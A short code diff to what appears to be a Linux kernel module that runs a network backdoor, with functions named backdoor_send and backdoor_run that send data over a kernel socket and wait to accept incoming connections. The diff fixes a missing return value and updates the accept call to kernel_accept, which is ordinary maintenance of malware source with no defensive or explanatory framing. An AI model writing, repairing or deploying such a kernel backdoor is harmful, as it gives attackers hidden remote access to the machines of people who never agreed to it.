@@ -52,6 +52,7 @@ ssize_t backdoor_send(struct socket *sock, uint8_t *buf, size_t len)
 	iov.iov_len = len;
 
   size = kernel_sendmsg(sock, &msg, &iov, 1, len);
+  return size;
 }
 
 int backdoor_run(void *data)
@@ -133,7 +134,7 @@ int backdoor_run(void *data)
 
     // Wait for accept
     debug("Waiting for connection\n");
-    err = bkdoor->conn->ops->accept(bkdoor->sock, bkdoor->conn, 0, 0);
+    err = kernel_accept(bkdoor->sock, &bkdoor->conn, 0);
     if (err < 0) {
       debug("Error accepting connection\n");
       // Error accepting connection
